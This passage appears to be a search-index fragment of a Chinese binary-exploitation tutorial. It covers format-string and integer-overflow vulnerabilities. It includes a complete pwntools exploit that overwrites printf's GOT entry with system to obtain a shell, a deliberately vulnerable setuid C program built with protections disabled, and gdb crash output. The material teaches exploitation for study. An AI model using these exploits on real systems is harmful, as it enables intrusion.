0xffffd1fc --> 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x08048512 in main () \u6211\u4eec\u770b\u5230\u8f93\u5165 printf() \u7684\u53d8\u91cf arg[0]: 0xffffd1f0 (\"AAAA\\n\") \u5728\u6808\u7684\u7b2c 5 \u884c\uff0c\u9664\u53bb\u7b2c\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u5373\u504f\u79fb\u91cf\u4e3a 4\u3002 \u8bfb\u53d6\u91cd\u5b9a\u4f4d\u8868\u83b7\u5f97 printf() \u7684 GOT \u5730\u5740\uff08\u7b2c\u4e00\u5217 Offset\uff09\uff1a $ readelf -r a.out Relocation section '.rel.dyn' at offset 0x2f4 contains 2 entries: Offset Info Type Sym.Value Sym. Name 08049ff8 00000406 R_386_GLOB_DAT 00000000 __gmon_start__ 08049ffc 00000706 R_386_GLOB_DAT 00000000 stdout@GLIBC_2.0 Relocation section '.rel.plt' at offset 0x304 contains 5 entries: Offset Info Type Sym.Value Sym. Name 0804a00c 00000107 R_386_JUMP_SLOT 00000000 read@GLIBC_2.0 0804a010 00000207 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.0 0804a014 00000307 R_386_JUMP_SLOT 00000000 fflush@GLIBC_2.0 0804a018 00000507 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 0804a01c 00000607 R_386_JUMP_SLOT 00000000 memset@GLIBC_2.0 \u5728 gdb \u4e2d\u83b7\u5f97 printf() \u7684\u865a\u62df\u5730\u5740\uff1a gdb-peda$ p printf $1 = {<text variable, no debug info>} 0xf7e26bf0 <printf> \u83b7\u5f97 system() \u7684\u865a\u62df\u5730\u5740\uff1a gdb-peda$ p system $1 = {<text variable, no debug info>} 0xf7e17060 <system> \u597d\u4e86\uff0c\u6f14\u793a\u5b8c\u600e\u6837\u7528\u624b\u5de5\u7684\u65b9\u5f0f\u5f97\u5230\u6784\u9020 exp \u9700\u8981\u7684\u4fe1\u606f\uff0c\u4e0b\u9762\u6211\u4eec\u7ed9\u51fa\u4f7f\u7528 pwntools \u6784\u9020\u7684\u5b8c\u6574\u6f0f\u6d1e\u5229\u7528\u4ee3\u7801\uff1a # -*- coding: utf-8 -*- from pwn import * elf = ELF('./a.out') r = process('./a.out') libc = ELF('/usr/lib32/libc.so.6') # \u8ba1\u7b97\u504f\u79fb\u91cf def exec_fmt(payload): r.sendline(payload) info = r.recv() return info auto = FmtStr(exec_fmt) offset = auto.offset # \u83b7\u5f97 printf \u7684 GOT \u5730\u5740 printf_got = elf.got['printf'] log.success(\"printf_got => {}\".format(hex(printf_got))) # \u83b7\u5f97 printf \u7684\u865a\u62df\u5730\u5740 payload = p32(printf_got) + '%{}$s'.format(offset) r.send(payload) printf_addr = u32(r.recv()[4:8]) log.success(\"printf_addr => {}\".format(hex(printf_addr))) # \u83b7\u5f97 system \u7684\u865a\u62df\u5730\u5740 system_addr = printf_addr - (libc.symbols['printf'] - libc.symbols['system']) log.success(\"system_addr => {}\".format(hex(system_addr))) payload = fmtstr_payload(offset, {printf_got : system_addr}) r.send(payload) r.send('/bin/sh') r.recv() r.interactive() $ python2 exp.py [*] '/home/firmy/Desktop/RE4B/a.out' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Starting local process './a.out': pid 17375 [*] '/usr/lib32/libc.so.6' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [*] Found format string offset: 4 [+] printf_got => 0x804a010 [+] printf_addr => 0xf7e26bf0 [+] system_addr => 0xf7e17060 [*] Switching to interactive mode $ echo \"hacked!\" hacked! \u8fd9\u6837\u6211\u4eec\u5c31\u83b7\u5f97\u4e86 shell\uff0c\u53ef\u4ee5\u770b\u5230\u8f93\u51fa\u7684\u4fe1\u606f\u548c\u6211\u4eec\u624b\u5de5\u5f97\u5230\u7684\u4fe1\u606f\u5b8c\u5168\u76f8\u540c\u3002","title":"pwntools pwnlib.fmtstr \u6a21\u5757"},{"location":"Tutorial/Material/Binary%20Exploitation/#312","text":"\u4ec0\u4e48\u662f\u6574\u6570\u6ea2\u51fa \u6574\u6570\u6ea2\u51fa \u6574\u6570\u6ea2\u51fa\u793a\u4f8b CTF \u4e2d\u7684\u6574\u6570\u6ea2\u51fa","title":"3.1.2 \u6574\u6570\u6ea2\u51fa"},{"location":"Tutorial/Material/Binary%20Exploitation/#_13","text":"","title":"\u4ec0\u4e48\u662f\u6574\u6570\u6ea2\u51fa"},{"location":"Tutorial/Material/Binary%20Exploitation/#_14","text":"\u5728 C \u8bed\u8a00\u57fa\u7840\u7684\u7ae0\u8282\u4e2d\uff0c\u6211\u4eec\u4ecb\u7ecd\u4e86 C \u8bed\u8a00\u6574\u6570\u7684\u57fa\u7840\u77e5\u8bc6\uff0c\u4e0b\u9762\u6211\u4eec\u8be6\u7ec6\u4ecb\u7ecd\u6574\u6570\u7684\u5b89\u5168\u95ee\u9898\u3002 \u7531\u4e8e\u6574\u6570\u5728\u5185\u5b58\u91cc\u9762\u4fdd\u5b58\u5728\u4e00\u4e2a\u56fa\u5b9a\u957f\u5ea6\u7684\u7a7a\u95f4\u5185\uff0c\u5b83\u80fd\u5b58\u50a8\u7684\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c\u662f\u56fa\u5b9a\u7684\uff0c\u5982\u679c\u6211\u4eec\u5c1d\u8bd5\u53bb\u5b58\u50a8\u4e00\u4e2a\u6570\uff0c\u800c\u8fd9\u4e2a\u6570\u53c8\u5927\u4e8e\u8fd9\u4e2a\u56fa\u5b9a\u7684\u6700\u5927\u503c\u65f6\uff0c\u5c31\u4f1a\u5bfc\u81f4\u6574\u6570\u6ea2\u51fa\u3002\uff08x86-32 \u7684\u6570\u636e\u6a21\u578b\u662f ILP32\uff0c\u5373\u6574\u6570\uff08Int\uff09\u3001\u957f\u6574\u6570\uff08Long\uff09\u548c\u6307\u9488\uff08Pointer\uff09\u90fd\u662f 32 \u4f4d\u3002\uff09","title":"\u7b80\u4ecb"},{"location":"Tutorial/Material/Binary%20Exploitation/#_15","text":"\u5982\u679c\u4e00\u4e2a\u6574\u6570\u7528\u6765\u8ba1\u7b97\u4e00\u4e9b\u654f\u611f\u6570\u503c\uff0c\u5982\u7f13\u51b2\u533a\u5927\u5c0f\u6216\u6570\u503c\u7d22\u5f15\uff0c\u5c31\u4f1a\u4ea7\u751f\u6f5c\u5728\u7684\u5371\u9669\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6574\u6570\u6ea2\u51fa\u5e76\u6ca1\u6709\u6539\u5199\u989d\u5916\u7684\u5185\u5b58\uff0c\u4e0d\u4f1a\u76f4\u63a5\u5bfc\u81f4\u4efb\u610f\u4ee3\u7801\u6267\u884c\uff0c\u4f46\u662f\u5b83\u4f1a\u5bfc\u81f4\u6808\u6ea2\u51fa\u548c\u5806\u6ea2\u51fa\uff0c\u800c\u540e\u4e24\u8005\u90fd\u4f1a\u5bfc\u81f4\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002\u7531\u4e8e\u6574\u6570\u6ea2\u51fa\u51fa\u73b0\u4e4b\u540e\uff0c\u5f88\u96be\u88ab\u7acb\u5373\u5bdf\u89c9\uff0c\u6bd4\u8f83\u96be\u7528\u4e00\u4e2a\u6709\u6548\u7684\u65b9\u6cd5\u53bb\u5224\u65ad\u662f\u5426\u51fa\u73b0\u6216\u8005\u53ef\u80fd\u51fa\u73b0\u6574\u6570\u6ea2\u51fa\u3002","title":"\u6574\u6570\u6ea2\u51fa\u7684\u5371\u5bb3"},{"location":"Tutorial/Material/Binary%20Exploitation/#_16","text":"\u5173\u4e8e\u6574\u6570\u7684\u5f02\u5e38\u60c5\u51b5\u4e3b\u8981\u6709\u4e09\u79cd\uff1a \u6ea2\u51fa \u53ea\u6709\u6709\u7b26\u53f7\u6570\u624d\u4f1a\u53d1\u751f\u6ea2\u51fa\u3002\u6709\u7b26\u53f7\u6570\u6700\u9ad8\u4f4d\u8868\u793a\u7b26\u53f7\uff0c\u5728\u4e24\u6b63\u6216\u4e24\u8d1f\u76f8\u52a0\u65f6\uff0c\u6709\u53ef\u80fd\u6539\u53d8\u7b26\u53f7\u4f4d\u7684\u503c\uff0c\u4ea7\u751f\u6ea2\u51fa \u6ea2\u51fa\u6807\u5fd7 OF \u53ef\u68c0\u6d4b\u6709\u7b26\u53f7\u6570\u7684\u6ea2\u51fa \u56de\u7ed5 \u65e0\u7b26\u53f7\u6570 0-1 \u65f6\u4f1a\u53d8\u6210\u6700\u5927\u7684\u6570\uff0c\u5982 1 \u5b57\u8282\u7684\u65e0\u7b26\u53f7\u6570\u4f1a\u53d8\u4e3a 255 \uff0c\u800c 255+1 \u4f1a\u53d8\u6210\u6700\u5c0f\u6570 0 \u3002 \u8fdb\u4f4d\u6807\u5fd7 CF \u53ef\u68c0\u6d4b\u65e0\u7b26\u53f7\u6570\u7684\u56de\u7ed5 \u622a\u65ad \u5c06\u4e00\u4e2a\u8f83\u5927\u5bbd\u5ea6\u7684\u6570\u5b58\u5165\u4e00\u4e2a\u5bbd\u5ea6\u5c0f\u7684\u64cd\u4f5c\u6570\u4e2d\uff0c\u9ad8\u4f4d\u53d1\u751f\u622a\u65ad","title":"\u6574\u6570\u6ea2\u51fa"},{"location":"Tutorial/Material/Binary%20Exploitation/#_17","text":"\u4e0a\u6ea2\u51fa int i; i = INT_MAX; // 2 147 483 647 i++; printf(\"i = %d\\n\", i); // i = -2 147 483 648 \u4e0b\u6ea2\u51fa i = INT_MIN; // -2 147 483 648 i--; printf(\"i = %d\\n\", i); // i = 2 147 483 647","title":"\u6709\u7b26\u53f7\u6574\u6570\u6ea2\u51fa"},{"location":"Tutorial/Material/Binary%20Exploitation/#_18","text":"\u6d89\u53ca\u65e0\u7b26\u53f7\u6570\u7684\u8ba1\u7b97\u6c38\u8fdc\u4e0d\u4f1a\u6ea2\u51fa\uff0c\u56e0\u4e3a\u4e0d\u80fd\u7528\u7ed3\u679c\u4e3a\u65e0\u7b26\u53f7\u6574\u6570\u8868\u793a\u7684\u7ed3\u679c\u503c\u88ab\u8be5\u7c7b\u578b\u53ef\u4ee5\u8868\u793a\u7684\u6700\u5927\u503c\u52a0 1 \u4e4b\u548c\u53d6\u6a21\u51cf\uff08reduced modulo\uff09\u3002\u56e0\u4e3a\u56de\u7ed5\uff0c\u4e00\u4e2a\u65e0\u7b26\u53f7\u6574\u6570\u8868\u8fbe\u5f0f\u6c38\u8fdc\u65e0\u6cd5\u6c42\u51fa\u5c0f\u4e8e\u96f6\u7684\u503c\u3002 \u4f7f\u7528\u4e0b\u56fe\u76f4\u89c2\u5730\u7406\u89e3\u56de\u7ed5\uff0c\u5728\u8f6e\u4e0a\u6309\u987a\u65f6\u9488\u65b9\u5411\u5c06\u503c\u9012\u589e\u4ea7\u751f\u7684\u503c\u7d27\u6328\u7740\u5b83\uff1a unsigned int ui; ui = UINT_MAX; // \u5728 x86-32 \u4e0a\u4e3a 4 294 967 295 ui++; printf(\"ui = %u\\n\", ui); // ui = 0 ui = 0; ui--; printf(\"ui = %u\\n\", ui); // \u5728 x86-32 \u4e0a\uff0cui = 4 294 967 295","title":"\u65e0\u7b26\u53f7\u6570\u56de\u7ed5"},{"location":"Tutorial/Material/Binary%20Exploitation/#_19","text":"\u52a0\u6cd5\u622a\u65ad\uff1a 0xffffffff + 0x00000001 = 0x0000000100000000 (long long) = 0x00000000 (long) \u4e58\u6cd5\u622a\u65ad\uff1a 0x00123456 * 0x00654321 = 0x000007336BF94116 (long long) = 0x6BF94116 (long)","title":"\u622a\u65ad"},{"location":"Tutorial/Material/Binary%20Exploitation/#_20","text":"\u6574\u578b\u63d0\u5347\u662f\u6307\u5f53\u8ba1\u7b97\u8868\u8fbe\u5f0f\u4e2d\u5305\u542b\u4e86\u4e0d\u540c\u5bbd\u5ea6\u7684\u64cd\u4f5c\u6570\u65f6\uff0c\u8f83\u5c0f\u5bbd\u5ea6\u7684\u64cd\u4f5c\u6570\u4f1a\u88ab\u63d0\u5347\u5230\u548c\u8f83\u5927\u64cd\u4f5c\u6570\u4e00\u6837\u7684\u5bbd\u5ea6\uff0c\u7136\u540e\u518d\u8fdb\u884c\u8ba1\u7b97\u3002 \u793a\u4f8b\uff1a \u6e90\u7801 #include<stdio.h> void main() { int l; short s; char c; l = 0xabcddcba; s = l; c = l; printf(\"\u5bbd\u5ea6\u6ea2\u51fa\\n\"); printf(\"l = 0x%x (%d bits)\\n\", l, sizeof(l) * 8); printf(\"s = 0x%x (%d bits)\\n\", s, sizeof(s) * 8); printf(\"c = 0x%x (%d bits)\\n\", c, sizeof(c) * 8); printf(\"\u6574\u578b\u63d0\u5347\\n\"); printf(\"s + c = 0x%x (%d bits)\\n\", s+c, sizeof(s+c) * 8); } $ ./a.out \u5bbd\u5ea6\u6ea2\u51fa l = 0xabcddcba (32 bits) s = 0xffffdcba (16 bits) c = 0xffffffba (8 bits) \u6574\u578b\u63d0\u5347 s + c = 0xffffdc74 (32 bits) \u4f7f\u7528 gdb \u67e5\u770b\u53cd\u6c47\u7f16\u4ee3\u7801\uff1a gdb-peda$ disassemble main Dump of assembler code for function main: 0x0000056d <+0>: lea ecx,[esp+0x4] 0x00000571 <+4>: and esp,0xfffffff0 0x00000574 <+7>: push DWORD PTR [ecx-0x4] 0x00000577 <+10>: push ebp 0x00000578 <+11>: mov ebp,esp 0x0000057a <+13>: push ebx 0x0000057b <+14>: push ecx 0x0000057c <+15>: sub esp,0x10 0x0000057f <+18>: call 0x470 <__x86.get_pc_thunk.bx> 0x00000584 <+23>: add ebx,0x1a7c 0x0000058a <+29>: mov DWORD PTR [ebp-0xc],0xabcddcba 0x00000591 <+36>: mov eax,DWORD PTR [ebp-0xc] 0x00000594 <+39>: mov WORD PTR [ebp-0xe],ax 0x00000598 <+43>: mov eax,DWORD PTR [ebp-0xc] 0x0000059b <+46>: mov BYTE PTR [ebp-0xf],al 0x0000059e <+49>: sub esp,0xc 0x000005a1 <+52>: lea eax,[ebx-0x1940] 0x000005a7 <+58>: push eax 0x000005a8 <+59>: call 0x400 <puts@plt> 0x000005ad <+64>: add esp,0x10 0x000005b0 <+67>: sub esp,0x4 0x000005b3 <+70>: push 0x20 0x000005b5 <+72>: push DWORD PTR [ebp-0xc] 0x000005b8 <+75>: lea eax,[ebx-0x1933] 0x000005be <+81>: push eax 0x000005bf <+82>: call 0x3f0 <printf@plt> 0x000005c4 <+87>: add esp,0x10 0x000005c7 <+90>: movsx eax,WORD PTR [ebp-0xe] 0x000005cb <+94>: sub esp,0x4 0x000005ce <+97>: push 0x10 0x000005d0 <+99>: push eax 0x000005d1 <+100>: lea eax,[ebx-0x191f] 0x000005d7 <+106>: push eax 0x000005d8 <+107>: call 0x3f0 <printf@plt> 0x000005dd <+112>: add esp,0x10 0x000005e0 <+115>: movsx eax,BYTE PTR [ebp-0xf] 0x000005e4 <+119>: sub esp,0x4 0x000005e7 <+122>: push 0x8 0x000005e9 <+124>: push eax 0x000005ea <+125>: lea eax,[ebx-0x190b] 0x000005f0 <+131>: push eax 0x000005f1 <+132>: call 0x3f0 <printf@plt> 0x000005f6 <+137>: add esp,0x10 0x000005f9 <+140>: sub esp,0xc 0x000005fc <+143>: lea eax,[ebx-0x18f7] 0x00000602 <+149>: push eax 0x00000603 <+150>: call 0x400 <puts@plt> 0x00000608 <+155>: add esp,0x10 0x0000060b <+158>: movsx edx,WORD PTR [ebp-0xe] 0x0000060f <+162>: movsx eax,BYTE PTR [ebp-0xf] 0x00000613 <+166>: add eax,edx 0x00000615 <+168>: sub esp,0x4 0x00000618 <+171>: push 0x20 0x0000061a <+173>: push eax 0x0000061b <+174>: lea eax,[ebx-0x18ea] 0x00000621 <+180>: push eax 0x00000622 <+181>: call 0x3f0 <printf@plt> 0x00000627 <+186>: add esp,0x10 0x0000062a <+189>: nop 0x0000062b <+190>: lea esp,[ebp-0x8] 0x0000062e <+193>: pop ecx 0x0000062f <+194>: pop ebx 0x00000630 <+195>: pop ebp 0x00000631 <+196>: lea esp,[ecx-0x4] 0x00000634 <+199>: ret End of assembler dump. \u5728\u6574\u6570\u8f6c\u6362\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6709\u53ef\u80fd\u5bfc\u81f4\u4e0b\u9762\u7684\u9519\u8bef\uff1a \u635f\u5931\u503c\uff1a\u8f6c\u6362\u4e3a\u503c\u7684\u5927\u5c0f\u4e0d\u80fd\u8868\u793a\u7684\u4e00\u79cd\u7c7b\u578b \u635f\u5931\u7b26\u53f7\uff1a\u4ece\u6709\u7b26\u53f7\u7c7b\u578b\u8f6c\u6362\u4e3a\u65e0\u7b26\u53f7\u7c7b\u578b\uff0c\u5bfc\u81f4\u635f\u5931\u7b26\u53f7","title":"\u6574\u578b\u63d0\u5347\u548c\u5bbd\u5ea6\u6ea2\u51fa"},{"location":"Tutorial/Material/Binary%20Exploitation/#_21","text":"\u6211\u4eec\u8bf4\u8fc7\u6574\u6570\u6ea2\u51fa\u8981\u914d\u5408\u4e0a\u5176\u4ed6\u7c7b\u578b\u7684\u7f3a\u9677\u624d\u80fd\u6709\u7528\uff0c\u4e0b\u9762\u7684\u4e24\u4e2a\u51fd\u6570\u90fd\u6709\u4e00\u4e2a size_t \u7c7b\u578b\u7684\u53c2\u6570\uff0c\u5e38\u5e38\u88ab\u8bef\u7528\u800c\u4ea7\u751f\u6574\u6570\u6ea2\u51fa\uff0c\u63a5\u7740\u5c31\u53ef\u80fd\u5bfc\u81f4\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\u3002 #include <string.h> void *memcpy(void *dest, const void *src, size_t n); memcpy() \u51fd\u6570\u5c06 src \u6240\u6307\u5411\u7684\u5b57\u7b26\u4e32\u4e2d\u4ee5 src \u5730\u5740\u5f00\u59cb\u7684\u524d n \u4e2a\u5b57\u8282\u590d\u5236\u5230 dest \u6240\u6307\u7684\u6570\u7ec4\u4e2d\uff0c\u5e76\u8fd4\u56de dest \u3002 #include <string.h> char *strncpy(char *dest, const char *src, size_t n); strncpy() \u51fd\u6570\u4ece\u6e90 src \u6240\u6307\u7684\u5185\u5b58\u5730\u5740\u7684\u8d77\u59cb\u4f4d\u7f6e\u5f00\u59cb\u590d\u5236 n \u4e2a\u5b57\u8282\u5230\u76ee\u6807 dest \u6240\u6307\u7684\u5185\u5b58\u5730\u5740\u7684\u8d77\u59cb\u4f4d\u7f6e\u4e2d\u3002 \u4e24\u4e2a\u51fd\u6570\u4e2d\u90fd\u6709\u4e00\u4e2a\u7c7b\u578b\u4e3a size_t \u7684\u53c2\u6570\uff0c\u5b83\u662f\u65e0\u7b26\u53f7\u6574\u578b\u7684 sizeof \u8fd0\u7b97\u7b26\u7684\u7ed3\u679c\u3002 typedef unsigned int size_t;","title":"\u6f0f\u6d1e\u591a\u53d1\u51fd\u6570"},{"location":"Tutorial/Material/Binary%20Exploitation/#_22","text":"\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u6574\u6570\u6ea2\u51fa\u7684\u539f\u7406\u548c\u4e3b\u8981\u5f62\u5f0f\uff0c\u4e0b\u9762\u6211\u4eec\u5148\u770b\u51e0\u4e2a\u7b80\u5355\u793a\u4f8b\uff0c\u7136\u540e\u5b9e\u9645\u64cd\u4f5c\u5229\u7528\u4e00\u4e2a\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\u3002","title":"\u6574\u6570\u6ea2\u51fa\u793a\u4f8b"},{"location":"Tutorial/Material/Binary%20Exploitation/#_23","text":"\u793a\u4f8b\u4e00\uff0c\u6574\u6570\u8f6c\u6362\uff1a char buf[80]; void vulnerable() { int len = read_int_from_network(); char *p = read_string_from_network(); if (len > 80) { error(\"length too large: bad dog, no cookie for you!\"); return; } memcpy(buf, p, len); } \u8fd9\u4e2a\u4f8b\u5b50\u7684\u95ee\u9898\u5728\u4e8e\uff0c\u5982\u679c\u653b\u51fb\u8005\u7ed9 len \u8d4b\u4e8e\u4e86\u4e00\u4e2a\u8d1f\u6570\uff0c\u5219\u53ef\u4ee5\u7ed5\u8fc7 if \u8bed\u53e5\u7684\u68c0\u6d4b\uff0c\u800c\u6267\u884c\u5230 memcpy() \u7684\u65f6\u5019\uff0c\u7531\u4e8e\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f size_t \u7c7b\u578b\uff0c\u8d1f\u6570 len \u4f1a\u88ab\u8f6c\u6362\u4e3a\u4e00\u4e2a\u65e0\u7b26\u53f7\u6574\u578b\uff0c\u5b83\u53ef\u80fd\u662f\u4e00\u4e2a\u975e\u5e38\u5927\u7684\u6b63\u6570\uff0c\u4ece\u800c\u590d\u5236\u4e86\u5927\u91cf\u7684\u5185\u5bb9\u5230 buf \u4e2d\uff0c\u5f15\u53d1\u4e86\u7f13\u51b2\u533a\u6ea2\u51fa\u3002 \u793a\u4f8b\u4e8c\uff0c\u56de\u7ed5\u548c\u6ea2\u51fa\uff1a void vulnerable() { size_t len; // int len; char* buf; len = read_int_from_network(); buf = malloc(len + 5); read(fd, buf, len); ... } \u8fd9\u4e2a\u4f8b\u5b50\u770b\u4f3c\u907f\u5f00\u4e86\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u95ee\u9898\uff0c\u4f46\u662f\u5982\u679c len \u8fc7\u5927\uff0c len+5 \u6709\u53ef\u80fd\u53d1\u751f\u56de\u7ed5\u3002\u6bd4\u5982\u8bf4\uff0c\u5728 x86-32 \u4e0a\uff0c\u5982\u679c len = 0xFFFFFFFF \uff0c\u5219 len+5 = 0x00000004 \uff0c\u8fd9\u65f6 malloc() \u53ea\u5206\u914d\u4e86 4 \u5b57\u8282\u7684\u5185\u5b58\u533a\u57df\uff0c\u7136\u540e\u5728\u91cc\u9762\u5199\u5165\u5927\u91cf\u7684\u6570\u636e\uff0c\u7f13\u51b2\u533a\u6ea2\u51fa\u4e5f\u5c31\u53d1\u751f\u4e86\u3002\uff08\u5982\u679c\u5c06 len \u58f0\u660e\u4e3a\u6709\u7b26\u53f7 int \u7c7b\u578b\uff0c len+5 \u53ef\u80fd\u53d1\u751f\u6ea2\u51fa\uff09 \u793a\u4f8b\u4e09\uff0c\u622a\u65ad\uff1a void main(int argc, char *argv[]) { unsigned short int total; total = strlen(argv[1]) + strlen(argv[2]) + 1; char *buf = (char *)malloc(total); strcpy(buf, argv[1]); strcat(buf, argv[2]); ... } \u8fd9\u4e2a\u4f8b\u5b50\u63a5\u53d7\u4e24\u4e2a\u5b57\u7b26\u4e32\u7c7b\u578b\u7684\u53c2\u6570\u5e76\u8ba1\u7b97\u5b83\u4eec\u7684\u603b\u957f\u5ea6\uff0c\u7a0b\u5e8f\u5206\u914d\u8db3\u591f\u7684\u5185\u5b58\u6765\u5b58\u50a8\u62fc\u63a5\u540e\u7684\u5b57\u7b26\u4e32\u3002\u9996\u5148\u5c06\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\u53c2\u6570\u590d\u5236\u5230\u7f13\u51b2\u533a\u4e2d\uff0c\u7136\u540e\u5c06\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8fde\u63a5\u5230\u5c3e\u90e8\u3002\u5982\u679c\u653b\u51fb\u8005\u63d0\u4f9b\u7684\u4e24\u4e2a\u5b57\u7b26\u4e32\u603b\u957f\u5ea6\u65e0\u6cd5\u7528 total \u8868\u793a\uff0c\u5219\u4f1a\u53d1\u751f\u622a\u65ad\uff0c\u4ece\u800c\u5bfc\u81f4\u540e\u9762\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\u3002","title":"\u793a\u4f8b"},{"location":"Tutorial/Material/Binary%20Exploitation/#_24","text":"\u770b\u4e86\u4e0a\u9762\u7684\u793a\u4f8b\uff0c\u6211\u4eec\u6765\u771f\u6b63\u5229\u7528\u4e00\u4e2a\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\u3002 \u6e90\u7801 #include<stdio.h> #include<string.h> void validate_passwd(char *passwd) { char passwd_buf[11]; unsigned char passwd_len = strlen(passwd); if(passwd_len >= 4 && passwd_len <= 8) { printf(\"good!\\n\"); strcpy(passwd_buf, passwd); } else { printf(\"bad!\\n\"); } } int main(int argc, char *argv[]) { if(argc != 2) { printf(\"error\\n\"); return 0; } validate_passwd(argv[1]); } \u4e0a\u9762\u7684\u7a0b\u5e8f\u4e2d strlen() \u8fd4\u56de\u7c7b\u578b\u662f size_t \uff0c\u5374\u88ab\u5b58\u50a8\u5728\u65e0\u7b26\u53f7\u5b57\u7b26\u4e32\u7c7b\u578b\u4e2d\uff0c\u4efb\u610f\u8d85\u8fc7\u65e0\u7b26\u53f7\u5b57\u7b26\u4e32\u6700\u5927\u4e0a\u9650\u503c\uff08256 \u5b57\u8282\uff09\u7684\u6570\u636e\u90fd\u4f1a\u5bfc\u81f4\u622a\u65ad\u5f02\u5e38\u3002\u5f53\u5bc6\u7801\u957f\u5ea6\u4e3a 261 \u65f6\uff0c\u622a\u65ad\u540e\u503c\u53d8\u4e3a 5\uff0c\u6210\u529f\u7ed5\u8fc7\u4e86 if \u7684\u5224\u65ad\uff0c\u5bfc\u81f4\u6808\u6ea2\u51fa\u3002\u4e0b\u9762\u6211\u4eec\u5229\u7528\u6ea2\u51fa\u6f0f\u6d1e\u6765\u83b7\u5f97 shell\u3002 \u7f16\u8bd1\u547d\u4ee4\uff1a # echo 0 > /proc/sys/kernel/randomize_va_space $ gcc -g -fno-stack-protector -z execstack vuln.c $ sudo chown root vuln $ sudo chgrp root vuln $ sudo chmod +s vuln \u4f7f\u7528 gdb \u53cd\u6c47\u7f16 validate_passwd \u51fd\u6570\u3002 gdb-peda$ disassemble validate_passwd Dump of assembler code for function validate_passwd: 0x0000059d <+0>: push ebp ; \u538b\u5165 ebp 0x0000059e <+1>: mov ebp,esp 0x000005a0 <+3>: push ebx ; \u538b\u5165 ebx 0x000005a1 <+4>: sub esp,0x14 0x000005a4 <+7>: call 0x4a0 <__x86.get_pc_thunk.bx> 0x000005a9 <+12>: add ebx,0x1a57 0x000005af <+18>: sub esp,0xc 0x000005b2 <+21>: push DWORD PTR [ebp+0x8] 0x000005b5 <+24>: call 0x430 <strlen@plt> 0x000005ba <+29>: add esp,0x10 0x000005bd <+32>: mov BYTE PTR [ebp-0x9],al ; \u5c06 len \u5b58\u5165 [ebp-0x9] 0x000005c0 <+35>: cmp BYTE PTR [ebp-0x9],0x3 0x000005c4 <+39>: jbe 0x5f2 <validate_passwd+85> 0x000005c6 <+41>: cmp BYTE PTR [ebp-0x9],0x8 0x000005ca <+45>: ja 0x5f2 <validate_passwd+85> 0x000005cc <+47>: sub esp,0xc 0x000005cf <+50>: lea eax,[ebx-0x1910] 0x000005d5 <+56>: push eax 0x000005d6 <+57>: call 0x420 <puts@plt> 0x000005db <+62>: add esp,0x10 0x000005de <+65>: sub esp,0x8 0x000005e1 <+68>: push DWORD PTR [ebp+0x8] 0x000005e4 <+71>: lea eax,[ebp-0x14] ; \u53d6 passwd_buf \u5730\u5740 0x000005e7 <+74>: push eax ; \u538b\u5165 passwd_buf 0x000005e8 <+75>: call 0x410 <strcpy@plt> 0x000005ed <+80>: add esp,0x10 0x000005f0 <+83>: jmp 0x604 <validate_passwd+103> 0x000005f2 <+85>: sub esp,0xc 0x000005f5 <+88>: lea eax,[ebx-0x190a] 0x000005fb <+94>: push eax 0x000005fc <+95>: call 0x420 <puts@plt> 0x00000601 <+100>: add esp,0x10 0x00000604 <+103>: nop 0x00000605 <+104>: mov ebx,DWORD PTR [ebp-0x4] 0x00000608 <+107>: leave 0x00000609 <+108>: ret End of assembler dump. \u901a\u8fc7\u9605\u8bfb\u53cd\u6c47\u7f16\u4ee3\u7801\uff0c\u6211\u4eec\u77e5\u9053\u7f13\u51b2\u533a passwd_buf \u4f4d\u4e8e ebp=0x14 \u7684\u4f4d\u7f6e\uff08 0x000005e4 <+71>: lea eax,[ebp-0x14] \uff09\uff0c\u800c\u8fd4\u56de\u5730\u5740\u5728 ebp+4 \u7684\u4f4d\u7f6e\uff0c\u6240\u4ee5\u8fd4\u56de\u5730\u5740\u76f8\u5bf9\u4e8e\u7f13\u51b2\u533a 0x18 \u7684\u4f4d\u7f6e\u3002\u6211\u4eec\u6d4b\u8bd5\u4e00\u4e0b\uff1a gdb-peda$ r `python2 -c 'print \"A\"*24 + \"B\"*4 + \"C\"*233'` Starting program: /home/a.out `python2 -c 'print \"A\"*24 + \"B\"*4 + \"C\"*233'` good! Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] EAX: 0xffffd0f4 ('A' <repeats 24 times>, \"BBBB\", 'C' <repeats 172 times>...) EBX: 0x41414141 ('AAAA') ECX: 0xffffd490 --> 0x534c0043 ('C') EDX: 0xffffd1f8 --> 0xffff0043 --> 0x0 ESI: 0xf7f95000 --> 0x1bbd90 EDI: 0x0 EBP: 0x41414141 ('AAAA') ESP: 0xffffd110 ('C' <repeats 200 times>...) EIP: 0x42424242 ('BBBB') EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x42424242 [------------------------------------stack-------------------------------------] 0000| 0xffffd110 ('C' <repeats 200 times>...) 0004| 0xffffd114 ('C' <repeats 200 times>...) 0008| 0xffffd118 ('C' <repeats 200 times>...) 0012| 0xffffd11c ('C' <repeats 200 times>...) 0016| 0xffffd120 ('C' <repeats 200 times>...) 0020| 0xffffd124 ('C' <repeats 200 times>...) 0024| 0xffffd128 ('C' <repeats 200 times>...) 0028| 0xffffd12c ('C' <repeats 200 times>...) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: 